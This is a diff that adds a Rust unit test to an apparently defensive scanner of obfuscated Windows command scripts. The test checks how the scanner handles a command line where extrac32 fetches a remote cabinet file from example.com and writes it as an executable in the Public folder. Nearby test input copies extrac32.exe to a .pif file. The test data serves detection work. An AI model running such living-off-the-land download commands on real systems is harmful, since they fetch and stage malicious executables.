@@ -24425,6 +24425,28 @@ mod extrac32_tests {
     }
 
     #[test]
+    fn escaped_ampersand_extrac32_text_does_not_emit_extrac32_trait() {
+        let mut env = Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"echo keep & extrac32 /Y /C http://example.com/a.cab C:\Users\Public\a.exe"#,
+            &mut env,
+        );
+
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Extrac32 {
+                    src,
+                    dst,
+                    self_reference: false,
+                } if src == "http://example.com/a.cab" && dst == r#"C:\Users\Public\a.exe"#
+            )),
+            "escaped echo extrac32 text emitted Extrac32 trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_extrac32_alias_replays_copy_arguments() {
         let report = crate::analyze(
             br#"extrac32 /c /y "C:\Windows\System32\extrac32.exe" "C:\Users\Public\expha.pif"
